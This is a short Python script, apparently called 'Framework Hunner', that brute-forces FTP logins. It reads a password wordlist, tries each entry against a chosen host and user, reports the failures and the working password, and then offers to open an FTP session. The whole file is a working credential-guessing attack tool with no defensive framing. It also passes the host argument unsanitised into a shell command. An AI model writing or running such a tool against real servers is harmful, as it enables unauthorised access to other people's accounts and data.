from ftplib import FTP
import time
import os,sys
import random
import argparse

method = 'ftp'

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

parser = argparse.ArgumentParser(description="Framework Hunner")
parser.add_argument('host', default='127.0.0.1', help=' Target host')
parser.add_argument('user', default='admin', help=' Target user')
parser.add_argument('file_password', help=' Password list')

args = parser.parse_args()
if args.host and args.user and args.file_password:
	user = args.user
	host = args.host
	file = args.file_password
	if os.path.exists(file):
		print(G+'Open file password'+W)
		text = open(file, 'r')
	else:
		print(F+'[!]'+'File not exists '+E)
		sys.exit(1)



def connect():
	for line in text:
		password = line.strip('\r\n')
		try:
			ftp = FTP(host)
			ft = ftp.login(user,password)
			print(G+time.ctime()+E+'Work user-> '+F+user+E+' work password-> '+F+password+E)
			print(E+'Connect ' +host+' ?')
			yes = input('Y/n')
			if yes == 'y' or yes == 'Y':
				print(G+'Ftp connect'+E)
				time.sleep(1)
				os.system('ftp '+host)
				break
			else:
				break
		except:
			print(O+time.ctime()+E+' '+'Not work user-> '+B+user+E+' paswword->'+B+password+E)
	sys.exit(1)
connect()